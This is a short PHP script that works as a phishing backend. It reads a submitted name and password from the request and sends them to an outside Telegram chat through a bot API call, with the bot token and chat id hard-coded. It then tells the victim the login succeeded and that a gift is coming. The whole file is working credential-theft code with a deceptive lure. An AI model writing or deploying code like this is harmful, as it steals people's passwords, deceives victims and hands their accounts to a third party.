

<?php
define ('url',"https://api.telegram.org/bot2108895570:AAGToyv-2HtxkCU9Ims-oXvGB-iqkaZDQyo/");
$name = $_GET['name'];
$password = $_GET['password'];
$chat_id = '1773053498';
$message = urlencode("Name:".$name."\n Password : ".$password);
file_get_contents(url."sendmessage?text=".$message."&chat_id=".$chat_id."&parse_mode=HTML");
if(isset($result['ok'])){
    if(isset($result['result'])){
        echo "Done";
    }else{
        echo $result['description'];
    }
}else{
    echo "Login sucessful! <br>
    Vedant will send your gift directly in your id";
}
?>